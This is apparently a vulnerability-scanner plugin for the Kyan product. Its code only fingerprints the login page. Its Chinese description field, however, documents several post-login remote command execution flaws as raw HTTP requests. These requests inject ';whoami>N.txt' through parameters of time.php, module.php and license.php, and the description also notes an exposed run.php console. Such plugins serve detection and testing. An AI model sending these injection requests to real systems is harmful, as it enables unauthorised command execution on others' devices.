from PocUtils import PocType, Severity
from PocUtils.Http import Http
from urllib.parse import urljoin


class Poc:
    def __init__(self):
        self.poc_type = PocType.http
        self.target = ""
        self.severity = Severity.info
        self.detail = """kyan有多个后台RCE漏洞

### run.php

这是一个控制台，直接访问就可以执行命令

### time.php

```
POST /time.php HTTP/1.1
Host: {{hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=t59mjp5du7evvi9gncm79qp2s6; SpryMedia_DataTables_filesystemTable_status.php=%7B%22iStart%22%3A%200%2C%22iEnd%22%3A%204%2C%22iLength%22%3A%2010%2C%22sFilter%22%3A%20%22%22%2C%22sFilterEsc%22%3A%20true%2C%22aaSorting%22%3A%20%5B%20%5B0%2C'asc'%5D%5D%2C%22aaSearchCols%22%3A%20%5B%20%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%5D%2C%22abVisCols%22%3A%20%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D; MemoryTree=1|1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

timesynctype=;whoami>1.txt
```

运行结果会写入web根目录1.txt里面

### module.php

```
GET /module.php?cmd=delete&name=;whoami>2.txt; HTTP/1.1
Host: {{hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=t59mjp5du7evvi9gncm79qp2s6; SpryMedia_DataTables_filesystemTable_status.php=%7B%22iStart%22%3A%200%2C%22iEnd%22%3A%204%2C%22iLength%22%3A%2010%2C%22sFilter%22%3A%20%22%22%2C%22sFilterEsc%22%3A%20true%2C%22aaSorting%22%3A%20%5B%20%5B0%2C'asc'%5D%5D%2C%22aaSearchCols%22%3A%20%5B%20%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%5D%2C%22abVisCols%22%3A%20%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D; MemoryTree=1|1
Upgrade-Insecure-Requests: 1
```

结果会写入web根目录2.txt

### license.php

```
GET /license.php?cmd=delete&name=;whoami>3.txt HTTP/1.1
Host: {{hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=t59mjp5du7evvi9gncm79qp2s6; SpryMedia_DataTables_filesystemTable_status.php=%7B%22iStart%22%3A%200%2C%22iEnd%22%3A%204%2C%22iLength%22%3A%2010%2C%22sFilter%22%3A%20%22%22%2C%22sFilterEsc%22%3A%20true%2C%22aaSorting%22%3A%20%5B%20%5B0%2C'asc'%5D%5D%2C%22aaSearchCols%22%3A%20%5B%20%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%5D%2C%22abVisCols%22%3A%20%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D; MemoryTree=1|1
Upgrade-Insecure-Requests: 1
```

写入web根目录的3.txt
"""
        self.name = "发现Kyan"

    def check(self):
        return True

    def exploit(self):
        client = Http()
        client.url = self.target
        resp = client.get()
        if "login_files/button_login_to_bluesky.png" in resp.text:
            return True
        else:
            return False
